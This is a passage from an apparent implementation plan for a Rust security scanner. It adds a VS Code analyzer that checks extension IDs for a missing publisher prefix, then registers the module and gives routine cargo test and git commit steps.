        .map(|id| Finding {
            rule_id: rule.id.clone(),
            severity: rule.severity.clone(),
            file: file.path.clone(),
            line: None,
            message: format!("extension ID '{id}' has no publisher prefix"),
            snippet: Some((*id).to_owned()),
        })
        .collect()
}
```

Create `crates/scanner-analysis/src/vscode/mod.rs`:
```rust
use crate::{analyzer::Analyzer, models::Finding};
use scanner_repository::RepoSnapshot;
use scanner_rules::{Pattern, RuleSet};
use std::sync::Arc;

pub mod checks;

pub struct VsCodeAnalyzer;

impl Analyzer for VsCodeAnalyzer {
    fn analyze(&self, snapshot: &RepoSnapshot, rules: &Arc<RuleSet>) -> Vec<Finding> {
        let mut findings = Vec::new();
        for rule in &rules.rules {
            for file in &snapshot.files {
                let new = match &rule.pattern {
                    Pattern::Regex { value } => checks::check(file, rule, value),
                    Pattern::ExtensionIdCheck => checks::extension_id_check(file, rule),
                    _ => vec![],
                };
                findings.extend(new);
            }
        }
        findings
    }
}
```

Update `crates/scanner-analysis/src/lib.rs`:
```rust
pub mod analyzer;
pub mod models;
pub mod nodejs;
pub mod vscode;

pub use analyzer::Analyzer;
pub use models::{Finding, Verdict};
pub use nodejs::NodeJsAnalyzer;
pub use vscode::VsCodeAnalyzer;
```

- [ ] **Step 4: Run tests to verify they pass**
```bash
cargo test -p scanner-analysis
```
Expected: all existing tests pass plus 13 new VSCODE tests.

Run the full workspace to confirm nothing regressed:
```bash
cargo test
```
Expected: all tests across all crates pass.

- [ ] **Step 5: Commit**
```bash
git add crates/scanner-analysis/src/lib.rs \
        crates/scanner-analysis/src/vscode/mod.rs \
        crates/scanner-analysis/src/vscode/checks/mod.rs \
        crates/scanner-analysis/tests/vscode_001_test.rs \
        crates/scanner-analysis/tests/vscode_002_test.rs \
        crates/scanner-analysis/tests/vscode_003_test.rs \
        crates/scanner-analysis/tests/vscode_004_test.rs
git commit -m "feat(scanner-analysis): add VsCodeAnalyzer with VSCODE-001..004 rules"
```
